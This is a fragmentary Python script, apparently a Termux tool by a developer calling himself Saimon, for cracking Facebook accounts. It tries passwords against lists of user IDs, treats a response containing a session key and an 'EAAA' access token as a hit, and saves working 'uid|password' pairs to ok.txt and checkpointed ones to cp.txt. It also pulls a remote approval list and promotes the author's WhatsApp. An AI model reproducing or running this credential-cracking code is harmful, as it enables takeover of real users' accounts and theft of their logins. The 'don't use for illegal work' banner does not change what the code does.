# decoder by Saimon linux command __Tools Owner SAIMON 

# https://github.com/Talhafreescrip

# Python 3.11 ___WhatsApp 01773151605
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +01773151605")

	subprocess.check_output(["am", "start", "https://wa.me/+01773151605"])
...
class Main:
	...
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://raw.githubusercontent.com/SAIMON-king-06/OLD/main/Approval.txt').text
...
\033[0;96m
 ...
 > \033[0;92mDEVELOPER     : SAIMON RAHMAN 

 > \033[0;95mFACEBOOK ID   : saimonrahman999 

 > \033[0;41mWHATSAPP      : +01773151605

 \033[0;96m> YOUTUBE       : SAIMON WORLD
 ...
 > \033[0;97mWARNING       : DONT USE FOR ILLEGAL WORK     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r %s[>_] [SAIMONI] : %s/%s -> \033[0;92m [ SAIMONI-OK:%s ]- \033[0;93m[SAIMON-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r \033[0;92m[SAIMONI-OK😍] %s|%s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write(" [SAIMONII-OK😍] %s|%s\n"%(uid, pw))
				...
				print("\r \033[0;93m[SAIMONI-CP😭] %s|%s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write(" [SAIMONI-CP😭] %s|%s\n"%(uid, pw))
